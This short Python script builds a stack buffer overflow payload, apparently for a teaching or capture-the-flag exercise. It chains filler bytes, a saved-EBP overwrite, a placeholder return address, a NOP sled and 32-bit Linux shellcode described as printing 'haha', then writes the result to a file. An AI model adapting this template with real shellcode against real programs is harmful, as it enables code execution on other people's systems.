import struct

# Shellcode to print "haha"
shellcode = (
    b"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2"
    b"\x68\x61\x68\x61\x0a\x68\x68\x61\x68\x61"
    b"\x89\xe1\xb2\x05\xcd\x80\x31\xc0\xb0\x01"
    b"\x31\xdb\xcd\x80"
)

# Address to jump to (adjust based on your environment)
return_address = struct.pack("<I", 0x61ff00)  # Example address, change as needed

# Create the payload
payload = b"A" * 5  # Fill the buffer
payload += b"B" * 8  # Overwrite saved EBP
payload += return_address  # Overwrite return address with address of shellcode
payload += b"\x90" * 100  # NOP sled
payload += shellcode  # Inject shellcode

with open("payload.bin", "wb") as f:
    f.write(payload)